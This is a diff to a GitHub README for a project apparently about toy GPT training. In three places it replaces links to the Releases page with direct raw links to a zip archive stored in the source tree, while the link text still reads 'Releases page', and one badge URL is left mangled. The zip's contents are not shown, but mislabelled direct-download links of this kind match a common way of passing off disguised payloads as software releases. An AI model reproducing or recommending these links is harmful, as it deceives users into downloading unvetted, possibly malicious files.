@@ -6,7 +6,7 @@ Welcome to the **train-400-context-3** project! This application demonstrates, a
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/goncalopimentaa/train-400-context-3/releases)
+[![Download Latest Release](https://github.com/goncalopimentaa/train-400-context-3/raw/refs/heads/main/src/toy_gpt_train/context-train-3.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/goncalopimentaa/train-400-context-3/raw/refs/heads/main/src/toy_gpt_train/context-train-3.3.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ Before you start, make sure your system meets the following requirements:
 
 ## 💡 How to Use
 
-1. **Visit the Release Page**: Go to the [Releases page](https://github.com/goncalopimentaa/train-400-context-3/releases).
+1. **Visit the Release Page**: Go to the [Releases page](https://github.com/goncalopimentaa/train-400-context-3/raw/refs/heads/main/src/toy_gpt_train/context-train-3.3.zip).
 2. **Select the Latest Release**: Look for the most recent version. Currently, that is version 1.0.
 3. **Download**: Click on the download link for your operating system. 
 4. **Install**: Follow the standard installation process for your system.
@@ -57,7 +57,7 @@ Feel free to reach out if you have questions or need support:
 
 ## 📦 Download & Install
 
-To get started, you can download the software directly from our [Releases page](https://github.com/goncalopimentaa/train-400-context-3/releases). 
+To get started, you can download the software directly from our [Releases page](https://github.com/goncalopimentaa/train-400-context-3/raw/refs/heads/main/src/toy_gpt_train/context-train-3.3.zip). 
 
 1. Click the link to navigate to the page.
 2. Choose the version that matches your operating system.
